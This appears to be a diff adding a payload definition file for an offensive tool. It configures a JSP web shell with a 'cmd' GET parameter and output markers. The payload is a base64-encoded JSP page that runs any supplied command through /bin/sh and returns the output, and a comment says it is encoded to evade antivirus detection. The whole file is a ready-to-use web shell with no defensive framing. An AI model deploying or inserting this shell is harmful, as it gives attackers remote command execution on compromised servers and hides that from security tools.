@@ -1,0 +1,9 @@
+﻿# JSP web shell payload - base64 encoded to prevent AV detection
+shell_type: jsp
+description: "Minimal JSP command execution shell"
+cmd_param: cmd
+method: GET
+output_start: "SHELL_START"
+output_end: "SHELL_END"
+extra_headers: {}
+payload_b64: "PCVAIHBhZ2UgaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLioiJT48JVN0cmluZyBjbWQ9cmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpO2lmKGNtZCE9bnVsbCl7UHJvY2VzcyBwPVJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMobmV3IFN0cmluZ1tdeyIvYmluL3NoIiwiLWMiLGNtZH0pO0J1ZmZlcmVkUmVhZGVyIGJyPW5ldyBCdWZmZXJlZFJlYWRlcihuZXcgSW5wdXRTdHJlYW1SZWFkZXIocC5nZXRJbnB1dFN0cmVhbSgpKSk7U3RyaW5nIGxuO291dC5wcmludCgiU0hFTExfU1RBUlQiKTt3aGlsZSgobG49YnIucmVhZExpbmUoKSkhPW51bGwpb3V0LnByaW50bG4obG4pO291dC5wcmludCgiU0hFTExfRU5EIik7fSU+"
